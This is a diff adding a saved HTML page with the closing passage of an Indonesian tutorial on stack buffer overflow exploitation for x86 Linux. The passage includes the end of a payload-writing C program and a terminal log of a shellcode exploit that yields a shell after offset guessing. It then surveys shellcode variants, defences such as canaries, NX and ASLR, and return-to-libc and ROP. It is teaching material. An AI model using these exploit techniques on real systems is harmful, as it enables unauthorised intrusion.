+        <span class="hl opt">}</span>
+
+        f <span class="hl opt">=</span> <span class="hl kwd">fopen</span><span class="hl opt">(</span><span class="hl str">"data.dat"</span><span class="hl opt">,</span> <span class="hl str">"w"</span><span class="hl opt">);</span>
+        <span class="hl kwd">printf</span><span class="hl opt">(</span><span class="hl str">"len = %d</span><span class="hl esc">\n</span><span class="hl str">"</span><span class="hl opt">,</span> len<span class="hl opt">);</span>
+        <span class="hl kwd">fwrite</span><span class="hl opt">(&amp;</span>len<span class="hl opt">,</span> <span class="hl kwa">sizeof</span><span class="hl opt">(</span>len<span class="hl opt">),</span> <span class="hl num">1</span><span class="hl opt">,</span> f<span class="hl opt">);</span>
+        <span class="hl kwd">fwrite</span><span class="hl opt">(</span>data<span class="hl opt">,</span> len<span class="hl opt">,</span> <span class="hl num">1</span><span class="hl opt">,</span> f<span class="hl opt">);</span>
+        <span class="hl kwd">fclose</span><span class="hl opt">(</span>f<span class="hl opt">);</span>
+<span class="hl opt">}</span>
+</pre></div>
+<p>Sekarang program <code>save-exploit-v2</code> tidak perlu lagi alamat
+ mutlak di mana alamat buffer, kita hanya perlu memberi nilai offset 
+saja. Nilai offset tersebut akan ditambahkan ke salah satu variabel 
+stack saat ini (saya mengambil alamat <code>data[0]</code>). Ketika 
+sebuah program berjalan, alamat stack akan bertambah dan berkurang, tapi
+ tidak jauh dari nilai awal (yang sama untuk setiap program di sistem 
+tanpa ASLR).</p>
+<blockquote><p>Catatan: sebenarnya ini <code>&amp;data[0]</code> cukup ditulis <code>(int)data</code>, tapi saya hanya ingin memperjelas bahwa saya mengambil suatu alamat awal sebuah array.</p></blockquote>
+<p>Kita bisa mencoba menjalankan program ini seperti ini (selang seling dengan <code>load</code>
+ untuk mengetes exploit). Pertama kita coba dengan offset 0, lalu karena
+ gagal, saya coba tambahkan dengan 64 (1/2 ukuran buffer), lalu saya 
+coba lagi dengan 128. Di usaha yang ketiga saya sudah berhasil, 
+perhatikan bahwa saya memakai offset <code>0xbffff7a0</code> sedangkan lokasi eksak buffer <code>name</code> ada di <code>0xbffff778</code>, tapi eksploitnya tetap berjalan.</p>
+<pre><code> yohanes@development:~$ ./save-exploit-v2 0
+ using return address bffff720
+ len = 160
+ yohanes@development:~$ ./load
+ len = 160
+ name = ���������������������������������������������������������������������������������������������X����҈P�P
+                                                                                                             1�̀
+                                                                                                               ����/bin/sh �� �� �� �� �� �� �� �������u'�
+ address of name = 0xbffff778
+ Segmentation fault
+ yohanes@development:~$ ./save-exploit-v2 64
+ using return address bffff760
+ len = 160
+ yohanes@development:~$ ./load
+ len = 160
+ name = ���������������������������������������������������������������������������������������������X����҈P�P
+                                                                                                             1�̀
+                                                                                                               ����/bin/sh`��`��`��`��`��`��`��`�������u'�
+ address of name = 0xbffff778
+ Segmentation fault
+ yohanes@development:~$ ./save-exploit-v2 128
+ using return address bffff7a0
+ len = 160
+ yohanes@development:~$ ./load
+ len = 160
+ name = ���������������������������������������������������������������������������������������������X����҈P�P
+                                                                                                             1�̀
+                                                                                                               ����/bin/sh�����������������������������u'�
+ address of name = 0xbffff778
+ sh-3.2$
+</code></pre>
+<h2><a name="index6h2"></a>Penutup</h2>
+<p>Topik dasar untuk eksploitasi stack overflow sudah saya bahas, namun 
+masih ada beberapa hal yang tersisa. Pertama adalah mengenai "aneka 
+macam shellcode". Kedua adalah proteksi stack overflow dan bagaimana 
+melewati proteksi tersebut (yang kadang bisa dilakukan, kadang tidak). 
+Ketiga adalah teknik eksploitasi tingkat lanjut.</p>
+<p>Shellcode yang dibahas di sini adalah shellcode untuk x86 di OS 
+Linux, shellcode tersebut hanya menjalankan shell saja. Masih ada banyak
+ varian shellcode lain:</p>
+<ul>
+<li>Shellcode untuk prosessor lain dengan OS yang sama (misalnya Linux 
+di ARM). Perbedaannya ada pada perbedaan instruksi untuk syscall</li>
+<li>Shellcode untuk OS lain</li>
+<li>Shellcode yang melakukan aksi selain menjalankan shell (misalnya mendengarkan paket jaringan, menambah user, dsb)</li>
+<li>Shellcode dengan karakteristik tertentu, misalnya hanya terdiri atas karakter alfanumerik, sehingga bisa lolos filter</li>
+</ul>
+<p>Mungkin saya akan membahas sebagian shellcode yang lain. Untuk saat ini Anda bisa mendapatkan berbagai macam shellcode dari <a href="https://www.exploit-db.com/shellcode/">http://www.exploit-db.com/shellcode/</a>. Saat artikel ini ditulis, ada lebih dari 400 shellcode di situs tersebut.</p>
+<p>Hal kedua adalah mengenai teknik untuk menghambat eksekusi eksploit stack overflow. Beberapa teknik yang ada saat ini adalah:</p>
+<ul>
+<li>Kenari (Canary): proteksi level compiler untuk mencegah kondisi stack yang corrupt</li>
+<li>DEP/NX Bit: proteksi level hardware dengan bantuan OS, membuat data di-stack tidak bisa dieksekusi</li>
+<li>ASLR: Address Space Layout Randomization. Proteksi level OS yang 
+memindahkan alamat memori supaya lebih sulit menemukan alamat untuk 
+diserang</li>
+</ul>
+<p>Hal lain untuk mencegah eksploit adalah: review kode, memakai library
+ yang melakukan pengecekan lebih ketat, memakai compiler yang mengecek 
+akses array, dsb. Hal ketiga adalah mengenai teknik eksploitasi tingkat 
+lanjut, kebanyakan teknik ini dikembangkan berhubungan dengan proteksi 
+stack overflow. Contoh:</p>
+<ul>
+<li>Return-to-libc</li>
+<li>Register spring</li>
+<li>Return oriented programming (generalisasi dari return-to-libc)</li>
+</ul>
+<p>Kemungkinan seri tulisan saya tidak akan membahas semuanya secara detail (misalnya prinsip <em>return oriented programming</em> mudah dijelaskan, tapi detail praktiknya akan sangat panjang).</p>
+
+<div id="backlinks">
+Links:
+<a href="https://yohan.es/security/buffer-overflow/">buffer-overflow</a>
+</div>
+<p class="footer">
+Last update: <span class="date">late Wednesday evening, March 27th, 2019</span>
+</p>
+<p>
+Copyright © 2009-2018 Yohanes Nugroho
+</p>
+</div>
+</div>
+</div>
+<script src="Shellcode_files/jquery-1.js" type="text/javascript"></script>
+<script src="Shellcode_files/bootstrap.js" type="text/javascript"></script>
+
+
+</body></html>
